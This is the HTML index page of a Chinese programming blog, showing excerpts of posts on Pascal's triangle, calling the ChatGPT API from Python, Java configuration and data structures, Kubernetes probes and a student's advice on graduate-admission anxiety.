<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ca05a486c2aa44f7f884bd663ca3e8d/" rel="bookmark">
			数据算法之打印杨辉三角
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		杨辉三角的打印 1. 基础版方法2.升级版方法（记忆法优化）3.加强版方法（对空间复杂度的优化）总结 这里主要介绍杨辉三角的三个打印方法，由浅入深，建议顺序观看
1. 基础版方法 先来看杨辉三角长什么样：
正如图片中所看到的，杨辉 三角就长这个样子，杨辉三角具有很多特性，但是在这里我们只使用他的其中 一个特性，即：
每个数等于它上方两数之和。
在这里我们先将杨辉三角斜过来看，简化操作，通过将杨辉三角斜过来看可以得到一个这样的直角三角形：
1
1 1
1 2 1
1 3 3 1
1 4 6 4 1
通过简化后的杨辉三角我们来考虑每一行每个数如何生成，
假设我们要 求第 i 行，第 j列的数值，根据杨辉三角中每个数等于它上方两数之和，我们可以得到第 i 行，第 j列数字的表达式为
[ i ] [ j ] = [ i-1 ] [ j ] + [ i -1 ][ j -1 ]
但是观察我们简化的杨辉三角，可以发现有特殊情况，就是可以看到第一列的数值全部为1，而且第一行第一列，第二行第二列，第三行第三列等等都是1，转化为我们的代码就是：
if （j = 1 || i = j）{ return 1 }
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ca05a486c2aa44f7f884bd663ca3e8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e0f9ad3e6fdb76d3eef6274ef555af8/" rel="bookmark">
			手把手教你使用Python调用 ChatGPT！支持http代理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		手把手教你使用Python调用 ChatGPT！支持http代理 作者：虚坏叔叔
博客：https://xuhss.com
早餐店不会开到晚上，想吃的人早就来了！😄
前段时间OpenAI 开放了两个新模型的api接口，专门为聊天而生的 gpt-3.5-turbo 和 gpt-3.5-turbo-0301。
ChatGPT is powered by gpt-3.5-turbo, OpenAI’s most advanced language model.
从上面这句话，我们可以知道现在 chat.openai.com 官网就是由 gpt-3.5-turbo 模型提供的服务，现在官方公开了这一模型的调用接口，这使得我们这些普通开发者也能直接在自己的应用/服务中使用这个狂揽亿万用户的模型。
接下来将和大家介绍如何利用 Python 快速玩转 gpt-3.5-turbo。
一、先跑起来，再理解 首先你需要有一个 openai 账号，如何注册我就不多说了，网上教程很多，而且很详细，如果有问题可以加我微信：pythonbrief，添加通过后请直接描述你的问题+问题截图。
访问下面页面，登录 openai 账号后，创建一个 api keys。
# api keys 创建页面 https://platform.openai.com/account/api-keys 接下来很简单了，安装 openai 官方的 Python SDK，这里需要注意的是得安装最新版本 openai，官方推荐的是 0.27.0 版本。
pip install openai==0.27.0 直接上请求代码：
import openai import json # 目前需要设置代理才可以访问 api os.environ["HTTP_PROXY"] = "自己的代理地址" os.environ["HTTPS_PROXY"] = "自己的代理地址" def get_api_key(): # 可以自己根据自己实际情况实现 # 以我为例子，我是存在一个 openai_key 文件里，json 格式 ''' {"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e0f9ad3e6fdb76d3eef6274ef555af8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a045844530861173972d1b72c636ae1/" rel="bookmark">
			Java读取配置文件的方式详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1、为什么需要使用配置文件？
2、Java 读取配置文件常用的几种方式
（1）使用 Properties 类读取 .properties 文件
（2）使用 XML 读取 .xml 文件
（3）使用 JSON 读取 .json 文件
（4）使用注解读取配置信息
3、Spring 读取配置文件常用的几种方式
（1）使用 PropertyPlaceholderConfigurer 类读取 .properties 文件
（2）使用 @PropertySource 注解读取 .properties 文件
（3）使用 Environment 类读取配置信息
4、SpringBoot 读取配置文件常用的几种方式
（1）使用 @Value 注解读取配置文件
（2）使用 @ConfigurationProperties 注解读取配置文件
（3）使用 Environment 读取配置文件
1、为什么需要使用配置文件？ 配置文件是一种存储应用程序配置信息的文本文件，它可以存储诸如数据库连接字符串、应用程序路径、调试开关、日志级别等一些与应用程序相关的信息。在实际应用程序开发中，使用配置文件可以有以下好处：
避免硬编码：硬编码是指将应用程序的配置信息直接嵌入到代码中，这样的代码不仅难以维护，而且需要对代码进行重新编译才能修改这些配置信息。使用配置文件可以将这些信息与代码分离，使得应用程序更加灵活。
提高可移植性：不同的应用程序在不同的环境下可能需要不同的配置信息，使用配置文件可以使得应用程序的配置信息更易于迁移，使得应用程序在不同的环境下都可以正常运行。
提高安全性：某些敏感的配置信息，如数据库连接字符串、密码等，不应该直接写在代码中，而是应该保存在安全的地方，使用配置文件可以将这些敏感信息保存在加密的配置文件中，提高了应用程序的安全性。
方便管理：使用配置文件可以使得应用程序的配置信息更易于管理，如通过配置文件可以很容易地对不同的配置信息进行分类、分组和排序，便于维护和管理。
配置文件是一种非常重要的应用程序开发工具，它可以使得应用程序更加灵活、可移植、安全和易于管理。
2、Java 读取配置文件常用的几种方式 在Java中，读取配置文件通常有以下几种方案：
（1）使用 Properties 类读取 .properties 文件 在Java中，Properties是一个非常常用的类，用于读取和写入.properties文件。Properties类继承自Hashtable，因此也可以用来存储键值对。
Properties类可以将键值对保存在.properties文件中，该文件通常是一个文本文件，每行都包含一个键值对，键值对之间用等号“=”分隔。可以通过Properties类的load()方法来读取.properties文件，并将其中的键值对加载到Properties对象中。可以使用getProperty()方法获取特定键的值，也可以使用setProperty()方法来设置键值对。最后，通过store()方法，可以将Properties对象中的键值对写回到.properties文件中。
以下是使用Properties类的示例：
import java.io.FileInputStream; import java.io.FileOutputStream; import java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7a045844530861173972d1b72c636ae1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/77d7d095133cec9beb4ed817250d2501/" rel="bookmark">
			使用函数统计指定数字的个数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本题要求实现一个统计整数中指定数字的个数的简单函数。
CountDigit(number,digit )
其中number是整数，digit为[1, 9]区间内的整数。函数CountDigit应返回number中digit出现的次数。
函数接口定义： 在这里描述函数接口。例如： CountDigit(number,digit ),返回digit出现的次数 裁判测试程序样例： /* 请在这里填写答案 */ number,digit=input().split() number=int(number) digit=int(digit) count=CountDigit(number,digit ) print("Number of digit 2 in "+str(number)+":",count) 输入样例： 在这里给出一组输入。例如：
-21252 2 输出样例： 在这里给出相应的输出。例如：
Number of digit 2 in -21252: 3 代码解析
def CountDigit(number, digit): sums = 0 for i in str(number): if i == str(digit): sums += 1 return sums 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78020136040e0f1327e732ef6e4e099f/" rel="bookmark">
			安装pesq，报错error: Microsoft Visual C&#43;&#43; 14.0 or greater is required
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		操作指南： 下载并安装 1-Microsoft Visual C++ Build Tools，安装pesq包的前提条件。
然后再去安装pesq包
pip install pesq 附图： 参考文章： 1、Microsoft Visual C++ Build Tools安装问题及解决方案
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0c42cb7673192876c8901e197490a78/" rel="bookmark">
			为什么保研的我如此焦虑？【关于保研焦虑学长想说】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我是 @小吴学长er，本科通信工程，夏令营保研上岸浙江大学，拿到中科大、东南、成电等10余所学校offer，相关经历可参见以下经验贴：
小吴学长er：2022年（23届）电子信息/通信工程保研|四非上岸浙大的保研之旅（浙大、中科大、哈工大、东南、南开、西电、成电等）11 赞同 · 8 评论文章正在上传…重新上传取消https://zhuanlan.zhihu.com/p/593638617
最近挺多学弟学妹都跟我说感觉好焦虑、联系导师结果都说满了等等，学长也想起了去年保研的这个时候和大家一样 也挺焦虑的，所以今天想来聊聊【保研焦虑】这个话题，依旧是采取【分析原因➕提出解决方案】的思路
全文约2600字，多图预警，阅读全文约️5分钟
首先我们要明白，保研过程中大家感到焦虑是一种非常常见的现象。因为对于大家来说，到目前为止保研可能是仅次于高考第二重要的事儿，所以感到焦虑或者不安再正常不过了。造成这种现象的原因其实挺多的：
一、竞争压力 保研的竞争非常激烈，而且真的一届比一届卷，拿学长去的【浙大工院】举例子：2018级夏令营报名人数1600，到19级就变成了2800，再到大家的20级就可能就会变成了3500+；但是工院每年拟录取的人数却不会因为保研人数的增加而增加。
小吴学长er：2022年（23届）电子信息/通信工程夏令营保研/考研复试经验贴（浙江大学工程师学院篇）7 赞同 · 0 评论文章正在上传…重新上传取消https://zhuanlan.zhihu.com/p/593635448
再说【东南信院】（应该是很多EE学子的梦校了，它只有夏令营），19级夏令营报名人数1700+，去年拟录取的保研er（硕士➕直博）只有234名，报录比约1:8
小吴学长er：2022年（23届）电子信息/通信工程夏令营保研/考研复试经验贴（东南大学信息科学与工程学院篇）16 赞同 · 8 评论文章正在上传…重新上传取消https://zhuanlan.zhihu.com/p/561647885
造成这种情况的原因其实是信息差在减小，每年都有很多优秀的学弟学妹申请保研，这种peer pressure可能会导致大家感到焦虑和紧张。
️二、自我要求过高 有些学弟学妹可能因为自我要求过高，对自己的成绩和综合素质要求过高，从而导致自己感到非常焦虑和紧张，害怕自己的成绩和综合素质不够好，无法去到梦校。
还有的同学可能本科双非/高考失利，然后在大学里面非常努力，憋着一股劲儿期待靠保研逆袭去一个好学校，所以自然很容易焦虑紧张。学长去年保研的时候其实和大家是一样，特别是三四月的时候经常焦虑的睡不着，有的时候晚上在床上一闭上眼睛就开始流泪
三️、不确定性 保研的过程比较复杂，需要准备各种材料、参加面试等等。特别是五六月份的事情又超级多，这些步骤都需要很多的时间和精力，但是最终结果仍然【不确定】，因为很多老师也在海，这种不确定性会导致大家感到焦虑。
另一方面，保研不是一锤子买卖，不像考研只能选一个，每一个同学都会有很多选择，同时也会影响到别人的选择，还是拿学长举例：学长拿到浙大offer之后放弃了中科大的offer，把科大老师推荐给了通过小红书联系我的A女生，到️️9月的时候A女生也放弃了科大offer（去了清深），所以我把科大老师推荐给了之前联系过我的B女生，B女生就放弃了成电跟科大的老师达成了双选，紧接着C男生因为B女生放弃的原因顺利去到了成电，而C男生在此之前最好的offer其实只是西电。
所以这一切都充满不确定性，就像蝴蝶效应一样，不到9.28那天学弟学妹们按下拟录取那一刻，竞争始终会存在
️四、规划压力 很多学弟学妹们无法进行正确的规划时间，保研不像考研一样，选好一个学校埋头苦干就行，很多考研er现阶段在按部就班的刷高数、背单词。而保研er的压力会小很多，因为我们不需要刷题，相比起他们会感到“很闲”或者说“没啥事儿做”，可能复习一会儿就想水水各种保研群、看看网上的经验贴或者今天多睡一会儿我明天再复习也不迟，然后又会把自己看焦虑。
五️、对未来担忧 保研虽然可以免去考试的过程，但是研究生阶段的学习和生活压力也非常大。有些学弟学妹可能会担心自己无法适应研究生的学习和生活，从而导致焦虑。或者能不能选到一个满意学校/好老师/好课题组/好方向等等，然而现在一联系老师经常收到没名额了的回复 自然会很焦虑
因为一个好老师和良好的课题组氛围会让研究生生活过的非常nice，而遇到一些人品比较XX的导师的话研究生生涯可能过的就很煎熬。
️六、机构贩卖焦虑 现在很多保研机构为了营利和竞争，可能会夸大保研难度和竞争激烈程度，从而制造一种紧迫感和焦虑感，让学弟学妹们感到自己需要参加他们的课程或者购买他们的论文服务，才能在保研过程中获得更好的表现和成功的机会。有的时候还会刻意制造一些虚假或者不实的信息，让大家感到自己需要购买他们的保研服务，才能保证成功。
比如前段时间一个双非的电气学弟说他在的保研机构群里面，机构人员营销他们去年辅导了某双非上岸华科电气，结果我刚好在这个学校电气专业有认识的同学，一打听根本是编的
Fine，焦虑的原因是说不完的，其实更重要的是【解决措施】，学长结合了去年自身的情况想给现在还在焦虑的学弟学妹们几点建议，有需要的同学可以参考下：
️一、学会规划 首先因为保研的事儿挺多的，正事杂事一大堆，在上文中也有提到，所以建议做好学习规划，比如我今天给自己定目标除了日常的课程学习之外我要把DSP的某一章看完复习好/这周之内我准备把拿几个学院的老师团队信息看一下了发邮件联系联系/这个月底之前要把论文改好了投出去
目标不要定的太大或者难以完成，要在自己的能力和时间范围内进行细化，这样才有有条不紊的推进，一般可以给自己每天/每周/每月都制定一下计划，就像考研的同学一样按进度来，要不然像无头苍蝇一样时紧时松就很容易焦虑
️二、保持心态 相信自己的能力和实力，不要让焦虑影响你的自信心。很多学弟学妹喜欢水一些保研群，觉得多看一看会不会有很多有用的信息，但是实际上经常一看不仅浪费了时间而且把自己搞的特别焦虑了，原因其实很简单【大家说白了都是竞争关系，我有好东西为什么要发出来告诉你呢❓】
信息差的确很重要，但是想靠水群来获取的话内耗有点太大了，很容易得不偿失
所谓【幸存者偏差】只有有两把刷子的同学才会去水群，然后其余同学一看觉得好厉害然后再想想自己一下子就开始焦虑了，所以不要把大把的时间花在这个上面，放松或者空闲的时候可以适当看一看无伤大雅
️三、寻求支持 与家人、朋友和老师交流，分享你的感受和想法。他们可能会给你提供一些有用的建议和支持，帮助你缓解焦虑。包括跟自己本校往届保研有经验的学长多聊一聊，都会很有帮助，但是一定要礼貌，毕竟别人不欠你的，帮你是情分，不帮你是本分，可以请别人吃个饭喝个奶茶啥的，教育投资和知识付费是很正常的
也欢迎有保研帮带需求的学弟学妹dd我
也欢迎有保研帮带需求的学弟学妹dd我
️四、多加运动 不要每天都一直一直学，大脑一直紧绷很容易导致效率低下。学长其实真的很推荐大家每天抽一点时间运动一下，不管是有氧还是无氧。适当的运动和放松可以减轻焦虑和压力。可以尝试一些放松的活动放松身心，提高自我控制力。
学长去年选择的是每天夜跑，晚上跑完了回去洗完澡累死了眼睛都睁不开，还哪有时间焦虑不安，睡觉都来不及。
以上就是全部内容✅希望每个学弟学妹都能不再焦虑！！！去到梦校！！！
最后，在这里给准备保研的同学一个步骤建议：
找准自身定位—确定目标学校—准备文书材料—提前联系导师—复习专业课数学英语—填报系统—面试前再次针对性的复习—面试后复盘总结
面试真题，题量很大！
通信原理详细版问答（直接背就完事儿了！）
导师介绍/评价/团队招生信息
有需要的学弟学妹们可根据需要直接私信我！！！有问题欢迎交流提问！最后祝大家保研顺利，去往梦校！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfb98d1cacbef4f10a8af50c49056c14/" rel="bookmark">
			uniapp&#43;打开icofont彩色图标
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.去自己的项目（没有需要创建）下载font代码 2.全局安装iconfont-tools工具 npm install -g iconfont-tools 3.解析下载font 找到下载的文件夹 打开cmd命令行：（可以在搜索栏内输入cmd 或者借用vscode终端打开）
输入：iconfont-tools 一路enter即可 （配置改起来也没啥必要）
之后会生成一个文件夹
将编译好的文件置入项目中 打开文件 会有一个css后缀文件
放到项目任意位置 引入到app.vue钟皆可
使用 这个位置你输入什么 后续就需要加一个什么前缀
Over 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6904e3ca68688fa4d9575c6e6105cd4b/" rel="bookmark">
			Java数据结构—映射（Map）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		映射是一种将一个对象（或值）关联到另一个对象（或值）的方式，即将一个集合中的元素与另一个集合中的元素建立起对应关系。在编程中，映射通常用于表示键值对（Key-Value Pair），其中每个键都唯一地标识一个对应的值。
Java代码实现映射的创建：
在Java中，可以使用以下两种数据结构来实现映射：
1. HashMap：基于哈希表实现，可以快速访问和修改元素，但不保证顺序。
Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); map.put("Alice", 25); map.put("Bob", 30); map.put("Charlie", 35); System.out.println(map.get("Bob")); // 输出 30 2. TreeMap：基于红黑树实现，元素按照键的自然顺序排序，或者根据指定的Comparator进行排序。
Map&lt;String, Integer&gt; map = new TreeMap&lt;&gt;(); map.put("Alice", 25); map.put("Bob", 30); map.put("Charlie", 35); System.out.println(map.get("Bob")); // 输出 30 示例：
假设需要统计一篇文章中每个单词出现的次数。可以使用映射来实现，其中每个单词作为键，出现次数作为对应的值。
public class WordCount { public static void main(String[] args) { String text = "hello world hello Java world"; String[] words = text.split(" "); Map&lt;String, Integer&gt; counts = new HashMap&lt;&gt;(); for (String word : words) { if (counts.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6904e3ca68688fa4d9575c6e6105cd4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8023d90643690afd7adfb31b5e2625a8/" rel="bookmark">
			python面向对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向对象中的几点概念： 类：用户定义的对象原型（prototype），该原型定义了一组可描述该类任何对象的属性，属性是数据成员（类变量 和 实例变量）和方法，可以通过 ‘.’ 来访问。说简单一点，类是一个模板，我们可以使用该模板生成不同的具体的对象，来完成我们想要的操作
实例：某一个类的单个对象，例如我们定义了一个 Person 类，而具体的人，比如小明，小黄就是 Person 类的实例
属性：描述该类具有的特征，比如人类具备的属性，身份证，姓名，性别，身高，体重等等都是属性
方法：是该类对象的行为，例如这个男孩会打篮球，那个女孩会唱歌等等都是属于方法，常常通过方法改变一些类中的属性值
定义一个类 Python 中定义类是使用关键字 class，一个简单的实例
class Student: pass # 创建对象实例 stu = Student() print(stu) print(property(stu)) print(type(stu)) 类属性与方法 类的私有属性
__private_attrs：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 self.__private_attrs。
类的方法
在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 self，且为第一个参数，self 代表的是类的实例。
self 的名字并不是规定死的，也可以使用 this，但是最好还是按照约定使用 self。
类的私有方法
__private_method：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用。self.__private_methods。
类的专有方法：
__cmp__: 比较运算
__call__: 函数调用
__add__: 加运算
__sub__: 减运算
__mul__: 乘运算
__truediv__: 除运算
__mod__: 求余运算
__init__ : 构造函数，在生成对象时调用
__del__ : 析构函数，释放对象时使用
__repr__ : 打印，转换
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8023d90643690afd7adfb31b5e2625a8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41cf3b930f2b093193f9cdbd2c7e501c/" rel="bookmark">
			Kubernetes 如何保障容器可用性？一文介绍探针的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		有时候，应用因为无限循环或死锁而停止响应，为确保应用在这种情况下可以重新启动，需要有一种机制检查应用程序的运行状况，而不是依赖应用程序内部的检测。
K8s 主要提供了三种探针来针对这种机制：
存活探针：用于检查容器是否正在运行。如果存活探针失败，则 K8s 认为该容器已死亡，并且将尝试重新启动容器。
就绪探针：用于检查容器是否已准备好接收流量。如果容器没有准备好，K8s 将不会将流量路由到该容器。
启动探针：用于检查容器是否已启动。与存活探针不同，启动探针在容器启动时运行一次，而不是在容器运行时持续运行。
探针的检查方法 exec：通过在容器内执行指定命令，来判断命令退出时返回的状态码，返回状态码是0表示正常。
httpGet：通过对容器的 IP 地址、端口和 URL 路径来发送 GET 请求；如果响应的状态码在 200 ~ 399 间，表示正常。
tcpSocket：通过对容器的 IP 地址和指定端口，进行 TCP 检查，如果端口打开，发起 TCP Socket 建立成功，表示正常。
配置项 initialDelaySeconds：等待我们定义的时间 结束后便开始探针检查
periodSeconds：探针的间隔时间
timeoutSeconds：探针的超时时间，当超过我们定义的时间后，便会被视为失败
successThreshold：探针的最小连续成功数量
failureThreshold：探针的最小连续失败数量
启动探针
apiVersion: v1 # 必选 API的版本号kind: Pod # 必选 类型Podmetadata: # 必选 元数据 name: nginx # 必选 符合RFC 1035规范的Pod名称 #namespace: default # 可选 Pod所在的命名空间 不指定默认为default 可以使用-n指定namespace labels: # 可选 标签选择器 一般用于过滤和区分Pod app: nginx-readyspec: # 必选 用于定义容器的详细信息 containers: # 必选 容器列表 - name: nginx # 必选 符合RFC 1035规范的容器名称 image: nginx:latest # 必选 容器所用的镜像的地址 imagePullPolicy: Always # 可选 镜像拉取策略 IfNotPresent:如果宿主机有这个镜像，就不用拉取了 Always：总是拉取 Never:不管存在不存在，都不拉取 ports: # 可选 容器需要暴露的端口号列表 - name: http # 端口名称 containerPort: 80 # 端口号 protocol: TCP # 端口协议 默认TCP startupProbe: # 可选 检测容器内进程是否完成启动 注意三种检查方式同时只能使用一种 failureThreshold: 3 # 失败三次算探针失败 exec: command: ['/bin/sh','-c','echo Hello World'] initialDelaySeconds: 3 # 容器启动完成后首次探测的时间，单位为秒 timeoutSeconds: 2 # 对容器健康检查探测等待响应的超时时间，单位秒，默认1秒 periodSeconds: 1 # 对容器监控检查的定期探测时间设置，单位秒，默认10秒一次 successThreshold: 1 # 成功1次算探针OK failureThreshold: 3 # 失败三次算探针失败 restartPolicy: Always # 可选 默认Always 容器故障或者没有启动成功 自动重启该容器 Onfailure: 容器以不为0的状态码终止 自动重启该容器 Never：无论何种状态 都不会重启 # kubectl apply -f pod.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/41cf3b930f2b093193f9cdbd2c7e501c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c366125de7d8b332afb1a15e5ec9d893/" rel="bookmark">
			Java数据结构—图（Graph）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图（Graph）是由节点（Vertex）和边（Edge）构成的一种数据结构。节点表示图中的元素，边表示节点之间的关系。图可以用于描述许多现实世界中的问题，例如社交网络、路线规划等。
在Java中，可以使用邻接矩阵和邻接表两种方式来创建和表示图。邻接矩阵是一个二维数组，其中每个元素表示两个节点之间是否有边。邻接表则是一个链表数组，其中每个链表表示一个节点连接的其他节点。
下面是使用邻接矩阵创建一个简单的无向图的Java代码示例：
public class Graph { private final int numVertices; private final boolean[][] adjMatrix; public Graph(int numVertices) { this.numVertices = numVertices; adjMatrix = new boolean[numVertices][numVertices]; } public void addEdge(int i, int j) { adjMatrix[i][j] = true; adjMatrix[j][i] = true; } } 这里我们定义了一个`Graph`类，其中`numVertices`表示节点数，`adjMatrix`表示邻接矩阵。`addEdge`方法用于在节点`i`和`j`之间添加一条边。
一个使用图的示例是路径查找。假设我们有一个城市地图，其中每个节点代表一个地点，每条边代表两个地点之间的道路。我们可以使用图来表示这个地图，然后使用广度优先搜索或深度优先搜索来查找两个地点之间的最短路径。
以下是一个使用邻接表创建无向图并进行深度优先搜索的Java代码示例：
import java.util.LinkedList; public class Graph { private final int numVertices; private final LinkedList&lt;Integer&gt;[] adjList; public Graph(int numVertices) { this.numVertices = numVertices; adjList = new LinkedList[numVertices]; for (int i = 0; i &lt; numVertices; i++) { adjList[i] = new LinkedList&lt;&gt;(); } } public void addEdge(int i, int j) { adjList[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c366125de7d8b332afb1a15e5ec9d893/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9e5ed35477d94a2286cb61dfbfba40b1/" rel="bookmark">
			Java数据结构—队列（Queue）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		队列是一种先进先出（FIFO）的数据结构，类似于现实中排队等待的场景。队列有两个基本操作：入队（enqueue）和出队（dequeue）。新元素被插入到队列的尾部，并且只有队列头部的元素才能被移除。
在Java中，可以使用LinkedList或ArrayDeque来实现队列。LinkedList是一个双向链表，在队列的头部和尾部添加元素非常快。而ArrayDeque是一个循环数组，对于较大的队列效率更高。
以下是使用Java代码创建队列的示例：
import java.util.LinkedList; import java.util.Queue; public class QueueExample { public static void main(String[] args) { Queue&lt;String&gt; queue = new LinkedList&lt;&gt;(); // 入队 queue.add("Alice"); queue.add("Bob"); queue.add("Charlie"); // 出队 String firstPerson = queue.remove(); System.out.println("The first person in the queue is " + firstPerson); // 查看队头元素 String head = queue.peek(); System.out.println("The head of the queue is " + head); } } 在这个示例中，我们使用了Java内置的Queue接口和LinkedList实现队列。我们首先添加了三个元素到队列中，然后从队列中删除第一个元素并打印它，最后查看队列的头部元素并打印。输出如下：
The first person in the queue is Alice The head of the queue is Bob 一个使用队列的示例是广度优先搜索（BFS）算法。BFS是一种用于遍历或搜索图的算法，它从图的一个起始节点开始，逐层遍历其邻居节点，直到找到目标节点为止。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9e5ed35477d94a2286cb61dfbfba40b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2d81847cc6b2e065c51ab824dc7e20f/" rel="bookmark">
			Java数据结构—树（Tree）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		树是一种非常常见的数据结构，它由节点和边组成，并满足以下条件：
1. 树中有一个唯一的根节点。
2. 除了根节点外，每个节点都有且仅有一个父节点。
3. 每个节点可以有零个或多个子节点。
在树中，节点与节点之间的关系被称为边。如果一个节点没有任何子节点，则该节点被称为叶子节点。树的深度等于从根节点到最远的叶子节点的距离。
在Java中，我们可以使用类来表示一个树节点。一个常见的树节点类如下所示：
class TreeNode { int val; TreeNode left; TreeNode right; TreeNode(int x) { val = x; } } 这个类包含了一个值`val`和两个指向左右子节点的引用`left`和`right`。我们可以使用递归算法来创建树。例如，下面的代码创建了一个简单的二叉树：
TreeNode root = new TreeNode(1); root.left = new TreeNode(2); root.right = new TreeNode(3); root.left.left = new TreeNode(4); root.left.right = new TreeNode(5); 这个二叉树长这样：
1 / \ 2 3 / \ 4 5 树是一种非常通用的数据结构，有许多应用。例如，文件系统可以使用树来组织文件和文件夹。在搜索算法中，我们经常使用树来搜索解空间。下面是一个查找二叉树中给定值的示例：
public boolean searchBST(TreeNode root, int val) { if (root == null) { return false; } if (root.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b2d81847cc6b2e065c51ab824dc7e20f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c192a87be0c47ea073399325a3334382/" rel="bookmark">
			Java数据结构—哈希表（Hash Table）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		哈希表是一种常见的数据结构，它使用哈希函数将键映射到数组索引上。哈希函数计算出的索引用于查找和插入元素。哈希表中每个元素都包含一个键和一个值，其中键用于查找元素，值则是对应键的数据。
在Java中，可以使用HashMap类来实现哈希表。创建一个HashMap对象很简单，只需使用无参构造函数即可：
HashMap&lt;String, Integer&gt; hashMap = new HashMap&lt;&gt;(); 这里创建了一个HashMap对象，用于存储字符串键和整数值。接下来，可以使用put()方法将键值对添加到哈希表中：
hashMap.put("apple", 1); hashMap.put("banana", 2); hashMap.put("cherry", 3); 这里分别将"apple"、"banana"和"cherry"作为键，将1、2和3作为值添加到了哈希表中。
使用哈希表的一个常见示例是统计字符串中各个字符的出现次数。例如，给定一个字符串s，要求输出其中每个字符以及它出现的次数。可以使用HashMap来实现：
String s = "hello world"; HashMap&lt;Character, Integer&gt; charCount = new HashMap&lt;&gt;(); for (char c : s.toCharArray()) { if (charCount.containsKey(c)) { charCount.put(c, charCount.get(c) + 1); } else { charCount.put(c, 1); } } for (char key : charCount.keySet()) { System.out.println(key + ": " + charCount.get(key)); } 这里首先将字符串s转换为字符数组，然后遍历每个字符。如果该字符已经在哈希表中存在，则将它的计数器加1；否则，将该字符添加到哈希表中，并将计数器初始化为1。最后，遍历哈希表中的所有键值对，并输出每个字符以及它的计数器。
总之，哈希表是一种常见的数据结构，它基于哈希函数将键映射到数组索引上。Java中可以使用HashMap类来实现哈希表，其基本操作包括添加和查找元素。哈希表的一个重要应用是统计元素的出现次数。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
